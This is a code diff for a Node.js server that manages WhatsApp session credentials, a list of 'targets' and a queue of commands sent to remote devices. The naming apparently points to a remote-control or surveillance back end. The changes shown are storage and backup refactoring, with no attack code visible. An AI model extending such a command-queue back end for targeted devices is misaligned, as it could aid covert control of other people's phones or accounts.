@@ -23,6 +23,7 @@ const OWNER_JID = process.env.OWNER_JID || null;
 const GROUP_MODE = process.env.GROUP_MODE === 'true';
 const AUTH_DIR = process.env.AUTH_DIR || './auth_info';
 const DB_PATH = process.env.DB_PATH || './data.db';
+const JSON_DB_PATH = './data.json';
 const TARGET_DB_PATH = process.env.TARGET_DB_PATH || './targets.json';
 const GROUP_JID_PATH = './group_jid.txt';
 
@@ -56,20 +57,29 @@ if (autoBackupB64 && fs.readdirSync(AUTH_DIR).length === 0) {
   else console.error('[!] Auth restore failed');
 }
 
-// ── Auth backup function (persists auth_info + group_jid + db) ──
+// ── Auth backup function (persists only critical files: creds.json + group_jid) ──
 async function generateAuthBackup() {
   try {
-    const wd = path.dirname(AUTH_DIR);
-    const names = [path.basename(AUTH_DIR)];
-    if (fs.existsSync(GROUP_JID_PATH)) names.push(path.basename(GROUP_JID_PATH));
-    if (fs.existsSync(DB_PATH)) names.push(path.basename(DB_PATH));
-    execSync(`cd "${wd}" && tar czf "${RAF_BACKUP}" ${names.map(n => `"${n}"`).join(' ')} 2>/dev/null`, { stdio: 'ignore' });
+    const tmpDir = path.join(os.tmpdir(), 'phantom_backup_' + Date.now());
+    fs.mkdirSync(tmpDir, { recursive: true });
+    fs.mkdirSync(path.join(tmpDir, path.basename(AUTH_DIR)), { recursive: true });
+    // Only back up creds.json — session files are regenerated on reconnect
+    const credsPath = path.join(AUTH_DIR, 'creds.json');
+    if (fs.existsSync(credsPath)) {
+      fs.copyFileSync(credsPath, path.join(tmpDir, path.basename(AUTH_DIR), 'creds.json'));
+    }
+    if (fs.existsSync(GROUP_JID_PATH)) {
+      fs.copyFileSync(GROUP_JID_PATH, path.join(tmpDir, path.basename(GROUP_JID_PATH)));
+    }
+    execSync(`cd "${tmpDir}" && tar czf "${RAF_BACKUP}" . 2>/dev/null`, { stdio: 'ignore' });
     const buf = fs.readFileSync(RAF_BACKUP);
     const b64 = buf.toString('base64');
     autoBackupB64 = b64;
     return b64;
   } catch (e) {
     return null;
+  } finally {
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
   }
 }
 
@@ -86,31 +96,108 @@ async function autoBackupAndLog() {
 
 const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });
 
-const SQL = await initSqlJs();
-let db;
-if (fs.existsSync(DB_PATH)) {
-  const buf = fs.readFileSync(DB_PATH);
-  db = new SQL.Database(buf);
-} else {
-  db = new SQL.Database();
+// ── JSON-backed storage (fallback if sql.js fails on Railway) ──
+let _nextCmdId = 1;
+let _devices = [];
+let _cmdQueue = [];
+
+function initJsonDb() {
+  if (fs.existsSync(JSON_DB_PATH)) {
+    try {
+      const data = JSON.parse(fs.readFileSync(JSON_DB_PATH, 'utf8'));
+      _devices = data.devices || [];
+      _cmdQueue = data.cmdQueue || [];
+      _nextCmdId = data.nextCmdId || 1;
+    } catch {}
+  }
+  const db = {
+    run(sql, params) {
+      const upper = sql.trim().toUpperCase();
+      if (upper.startsWith('INSERT INTO COMMAND_QUEUE')) {
+        const cmd = { id: _nextCmdId++, device_id: params[0], action: params[1], payload: params[2], created_at: params[3], delivered: 0, acked: 0 };
+        _cmdQueue.push(cmd);
+        return this;
+      }
+      if (upper.startsWith('UPDATE COMMAND_QUEUE')) {
+        const id = parseInt(params[0]);
+        const cmd = _cmdQueue.find(c => c.id === id);
+        if (cmd) { cmd.delivered = 1; cmd.acked = 1; }
+        return this;
+      }
+      if (upper.startsWith('INSERT INTO DEVICES')) {
+        const devId = params[0];
+        const now = params[1] || params[2]; // ON CONFLICT case has 4 params: [deviceId, now, now, now]
+        const dev = _devices.find(d => d.device_id === devId);
+        if (dev) { dev.last_seen = now; dev.is_online = 1; }
+        else _devices.push({ device_id: devId, last_seen: now, is_online: 1 });
+        return this;
+      }
+      return this;
+    },
+    exec(sql) {
+      const upper = sql.trim().toUpperCase();
+      if (upper.startsWith('SELECT LAST_INSERT_ROWID')) {
+        return { columns: ['last_insert_rowid()'], values: [[_nextCmdId - 1]] };
+      }
+      return { columns: [], values: [] };
+    },
+    prepare(sql) {
+      const upper = sql.trim().toUpperCase();
+      let rows = [];
+      if (upper.includes('FROM COMMAND_QUEUE')) {
+        rows = [..._cmdQueue.filter(c => !c.delivered)];
+      }
+      if (upper.includes('FROM DEVICES')) {
+        rows = [..._devices].sort((a, b) => b.last_seen - a.last_seen);
+      }
+      let idx = 0;
+      return {
+        bind() {},
+        step() { return idx < rows.length; },
+        getAsObject() { return rows[idx++]; },
+        free() {}
+      };
+    },
+    export() { saveJsonDb(); return Buffer.from('{}'); }
+  };
+  return db;
+}
+function saveJsonDb() {
+  fs.writeFileSync(JSON_DB_PATH, JSON.stringify({ devices: _devices, cmdQueue: _cmdQueue, nextCmdId: _nextCmdId }, null, 2));
 }
 
-db.run(`CREATE TABLE IF NOT EXISTS devices (
-  device_id TEXT PRIMARY KEY,
-  last_seen INTEGER NOT NULL,
-  is_online INTEGER NOT NULL DEFAULT 0
-)`);
-db.run(`CREATE TABLE IF NOT EXISTS command_queue (
-  id INTEGER PRIMARY KEY AUTOINCREMENT,
-  device_id TEXT NOT NULL,
-  action TEXT NOT NULL,
-  payload TEXT,
-  created_at INTEGER NOT NULL,
-  delivered INTEGER NOT NULL DEFAULT 0,
-  acked INTEGER NOT NULL DEFAULT 0
-)`);
+let db;
+try {
+  const SQL = await initSqlJs();
+  if (fs.existsSync(DB_PATH)) {
+    const buf = fs.readFileSync(DB_PATH);
+    db = new SQL.Database(buf);
+  } else {
+    db = new SQL.Database();
+  }
+  db.run(`CREATE TABLE IF NOT EXISTS devices (
+    device_id TEXT PRIMARY KEY,
+    last_seen INTEGER NOT NULL,
+    is_online INTEGER NOT NULL DEFAULT 0
+  )`);
+  db.run(`CREATE TABLE IF NOT EXISTS command_queue (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    device_id TEXT NOT NULL,
+    action TEXT NOT NULL,
+    payload TEXT,
+    created_at INTEGER NOT NULL,
+    delivered INTEGER NOT NULL DEFAULT 0,
+    acked INTEGER NOT NULL DEFAULT 0
+  )`);
+  console.log('[+] SQLite database initialized');
+} catch (e) {
+  console.error('[!] sql.js init failed, using JSON fallback:', e.message);
+  db = initJsonDb();
+}
 
-function saveDb() { fs.writeFileSync(DB_PATH, Buffer.from(db.export())); }
+function saveDb() {
+  try { fs.writeFileSync(DB_PATH, Buffer.from(db.export())); } catch {}
+}
 
 let targetMap = {};
 if (fs.existsSync(TARGET_DB_PATH)) {
